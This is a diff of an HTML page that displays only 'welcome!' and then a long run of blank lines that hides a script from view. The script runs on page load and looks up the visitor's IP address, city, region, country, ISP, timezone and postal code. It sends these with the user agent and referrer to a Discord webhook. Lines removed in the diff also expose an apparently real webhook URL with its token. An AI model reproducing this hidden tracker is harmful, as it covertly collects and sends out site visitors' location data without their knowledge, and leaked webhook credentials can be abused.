@@ -1,34 +1,103 @@
 welcome!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <script>
 window.addEventListener("load", async () => {
   if (sessionStorage.getItem("visitLogged")) return;
-
   sessionStorage.setItem("visitLogged", "true");
 
-  const webhookURL = "https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe";
-
-  const visitData = {
-    content: "🌐 New Unique Visit",
-    embeds: [{
-      title: "Visitor Info",
-      color: 5814783,
-      fields: [
-        { name: "Page", value: window.location.href },
-        { name: "User Agent", value: navigator.userAgent },
-        { name: "Referrer", value: document.referrer || "Direct Visit" }
-      ],
-      timestamp: new Date().toISOString()
-    }]
-  };
+  const webhookURL = "YOUR_WEBHOOK_URL";
 
   try {
+    // Get detailed IP info
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+
+    const visitData = {
+      content: "🌍 New Detailed Visit",
+      embeds: [{
+        title: "Visitor IP Details",
+        color: 3447003,
+        fields: [
+          { name: "IP", value: data.ip || "Unknown", inline: true },
+          { name: "City", value: data.city || "Unknown", inline: true },
+          { name: "Region", value: data.region || "Unknown", inline: true },
+          { name: "Country", value: data.country_name || "Unknown", inline: true },
+          { name: "ISP / Org", value: data.org || "Unknown" },
+          { name: "Timezone", value: data.timezone || "Unknown", inline: true },
+          { name: "Postal Code", value: data.postal || "Unknown", inline: true },
+          { name: "Page", value: window.location.href },
+          { name: "Referrer", value: document.referrer || "Direct Visit" }
+        ],
+        footer: {
+          text: navigator.userAgent
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
     await fetch(webhookURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(visitData)
     });
+
   } catch (err) {
-    console.error(err);
+    console.error("Error:", err);
   }
 });
 </script>
